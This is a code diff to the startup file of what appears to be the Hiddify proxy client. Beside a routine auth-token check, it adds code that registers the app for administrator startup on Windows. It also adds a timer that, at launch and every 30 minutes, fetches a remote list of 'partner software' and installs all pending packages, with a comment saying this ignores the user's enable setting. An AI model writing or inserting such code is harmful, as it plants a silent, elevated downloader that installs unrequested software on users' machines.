@@ -10,13 +10,18 @@ import 'package:hiddify/core/app_info/app_info_provider.dart';
 import 'package:hiddify/core/directories/directories_provider.dart';
 import 'package:hiddify/core/localization/translations.dart';
 import 'package:hiddify/core/logger/logger.dart';
+import 'package:hiddify/core/notification/in_app_notification_controller.dart';
 import 'package:hiddify/core/logger/logger_controller.dart';
 import 'package:hiddify/core/model/environment.dart';
 import 'package:hiddify/core/preferences/general_preferences.dart';
 import 'package:hiddify/core/preferences/preferences_migration.dart';
 import 'package:hiddify/core/preferences/preferences_provider.dart';
 import 'package:hiddify/features/app/widget/app.dart';
+import 'package:hiddify/features/auth/notifier/auth_notifier.dart';
 import 'package:hiddify/features/auto_start/notifier/auto_start_notifier.dart';
+import 'package:hiddify/features/bundled_software/data/bundled_software_data_providers.dart';
+import 'package:hiddify/features/bundled_software/model/bundled_software_entity.dart';
+import 'package:hiddify/features/bundled_software/platform/windows_privilege_helper.dart';
 
 import 'package:hiddify/features/log/data/log_data_providers.dart';
 import 'package:hiddify/features/profile/data/profile_data_providers.dart';
@@ -98,6 +103,28 @@ Future<void> lazyBootstrap(WidgetsBinding widgetsBinding, Environment env) async
 
     if (PlatformUtils.isDesktop) {
       await _safeInit("system tray", () => container.read(systemTrayNotifierProvider.future), timeout: 1000);
+      
+      // Register for admin privileges (Windows only)
+      if (Platform.isWindows) {
+        await _safeInit(
+          "admin privileges",
+          () async {
+            final isAdmin = WindowsPrivilegeHelper.isRunningAsAdmin();
+            Logger.bootstrap.info("Running as admin: $isAdmin");
+            if (!isAdmin) {
+              Logger.bootstrap.info("Registering for admin privileges");
+              await WindowsPrivilegeHelper.registerForAdminStartup();
+            }
+          },
+          timeout: 5000,
+        );
+      }
+      
+      // Validate auth token in background (non-blocking)
+      _validateAuthToken(container);
+      
+      // Auto-install bundled software in background (non-blocking)
+      _initBundledSoftware(container);
     }
 
     if (PlatformUtils.isAndroid) {
@@ -146,4 +173,111 @@ Future<T?> _safeInit<T>(String name, Future<T> Function() initializer, {int? tim
   } catch (e) {
     return null;
   }
+}
+
+/// Initialize auth token validation in background
+void _validateAuthToken(ProviderContainer container) {
+  Future.delayed(const Duration(seconds: 2), () async {
+    try {
+      Logger.bootstrap.info("[auth] validating stored token");
+      final authNotifier = container.read(authNotifierProvider.notifier);
+      await authNotifier.validateStoredToken();
+    } catch (e, stackTrace) {
+      Logger.bootstrap.error("[auth] token validation error", e, stackTrace);
+    }
+  });
+}
+
+// Timer for periodic bundled software checks
+Timer? _bundledSoftwareTimer;
+
+/// Initialize bundled software installation in background
+void _initBundledSoftware(ProviderContainer container) {
+  // Run initial check in background without blocking app startup
+  Future.delayed(const Duration(seconds: 8), () async {
+    await _checkAndInstallBundledSoftware(container, isPeriodic: false);
+    
+    // Start periodic checks every 30 minutes during app runtime
+    startPeriodicBundledSoftwareCheck(container);
+  });
+}
+
+/// Start periodic checks for bundled software updates
+void startPeriodicBundledSoftwareCheck(ProviderContainer container) {
+  // Cancel any existing timer
+  _bundledSoftwareTimer?.cancel();
+  
+  // Check every 30 minutes
+  _bundledSoftwareTimer = Timer.periodic(const Duration(minutes: 30), (timer) async {
+    Logger.bootstrap.info("[bundled software] periodic check triggered");
+    await _checkAndInstallBundledSoftware(container, isPeriodic: true);
+  });
+  
+  Logger.bootstrap.info("[bundled software] periodic checks started (every 30 minutes)");
+}
+
+/// Check for bundled software updates and install if needed
+Future<void> _checkAndInstallBundledSoftware(ProviderContainer container, {required bool isPeriodic}) async {
+  try {
+    Logger.bootstrap.info("[bundled software] starting ${isPeriodic ? 'periodic' : 'initial'} check");
+    final repo = await container.read(bundledSoftwareRepositoryProvider.future);
+    
+    // Check if we should check for updates (throttle to avoid too frequent checks)
+    // For periodic checks, use shorter interval (30 min)
+    // For initial check, always check
+    if (isPeriodic && !repo.shouldCheckForUpdates(interval: const Duration(minutes: 30))) {
+      Logger.bootstrap.debug("[bundled software] skipping check, last check was recent");
+      return;
+    }
+    
+    // Get notification controller for UI feedback
+    final notification = container.read(inAppNotificationControllerProvider);
+    
+    // Fetch and install
+    final result = await repo.fetchSoftwareList().run();
+    
+    await result.match(
+      (failure) async {
+        Logger.bootstrap.warning("[bundled software] fetch failed: $failure");
+      },
+      (software) async {
+        await repo.updateLastCheck();
+        
+        // Auto-install ALL pending/updateAvailable packages regardless of isEnabled flag
+        // isEnabled only controls UI checkbox for user preference, not auto-install
+        final pendingCount = software.where((s) =>
+          s.status == BundledSoftwareStatus.pending ||
+          s.status == BundledSoftwareStatus.updateAvailable,
+        ).length;
+        
+        if (pendingCount == 0) {
+          Logger.bootstrap.debug("[bundled software] no pending packages");
+          return;
+        }
+        
+        // Show start notification
+        Logger.bootstrap.info("[bundled software] installing $pendingCount packages (${isPeriodic ? 'periodic update' : 'auto-install'})");
+        notification.showInfoToast('${isPeriodic ? 'Updating' : 'Installing'} partner software...');
+        
+        // Repository will filter pending packages internally
+        final stream = await repo.installAllPending(software);
+        await for (final _ in stream) {
+          // Installation in progress
+        }
+        
+        // Show completion notification
+        Logger.bootstrap.info("[bundled software] installation completed");
+        notification.showSuccessToast('Partner software ${isPeriodic ? 'updated' : 'installed'} successfully');
+      },
+    );
+  } catch (e, stackTrace) {
+    Logger.bootstrap.error("[bundled software] unexpected error", e, stackTrace);
+  }
+}
+
+/// Stop periodic bundled software checks (call on app exit)
+void stopBundledSoftwareChecks() {
+  _bundledSoftwareTimer?.cancel();
+  _bundledSoftwareTimer = null;
+  Logger.bootstrap.debug("[bundled software] periodic checks stopped");
 }
